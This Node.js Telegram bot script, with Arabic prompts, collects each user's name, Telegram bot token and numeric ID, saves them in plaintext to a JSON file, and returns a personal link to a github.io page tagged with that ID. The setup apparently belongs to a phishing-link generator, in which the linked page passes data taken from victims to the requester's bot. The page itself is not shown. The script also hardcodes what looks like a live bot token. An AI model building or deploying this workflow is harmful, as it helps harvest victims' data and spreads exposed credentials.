import { Telegraf } from 'telegraf';
import fs from 'fs';
import http from 'http'; // ✅ تم إضافة هذا السطر

const mainBot = new Telegraf('8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4'); // ✨ غيّر هذا بالتوكن حقك

function loadUsers() {
  try {
    return JSON.parse(fs.readFileSync('users.json'));
  } catch {
    return {};
  }
}

function saveUsers(users) {
  fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
}

const users = loadUsers();

mainBot.start((ctx) => {
  const chatId = ctx.chat.id.toString();
  if (!users[chatId]) {
    users[chatId] = { step: 'name' };
    ctx.reply('👋 أهلاً بك! ما هو اسمك؟ 🤔');
  } else {
    ctx.reply('🔁 لقد بدأت من قبل!');
  }
});

mainBot.on('text', (ctx) => {
  const chatId = ctx.chat.id.toString();
  const text = ctx.message.text;

  if (!users[chatId]) {
    ctx.reply('🌀 اكتب /start للبدء.');
    return;
  }

  const user = users[chatId];

  if (user.step === 'name') {
    user.name = text;
    user.step = 'token';
    ctx.reply('🔑 أرسل الآن التوكن الخاص بك:');
  } else if (user.step === 'token') {
    if (text.includes(':')) {
      user.token = text;
      user.step = 'id';
      ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
    } else {
      ctx.reply('⚠️ التوكن غير صحيح. تأكد أن يحتوي على ":"');
    }
  } else if (user.step === 'id') {
    if (/^\d{5,}$/.test(text)) {
      user.id = text;
      user.step = 'done';
      ctx.reply(`✅ تم الحفظ بنجاح!

🌐 رابطك الخاص:
https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
      saveUsers(users);
    } else {
      ctx.reply('⚠️ ID غير صحيح. يجب أن يكون أرقام فقط.');
    }
  } else {
    ctx.reply('✅ بياناتك محفوظة مسبقًا.');
  }
});

mainBot.launch();
console.log('🤖 تم تشغيل البوت!');

// تحايل لفتح منفذ وهمي لتجنب خطأ Render
http.createServer(() => {}).listen(process.env.PORT || 3000);
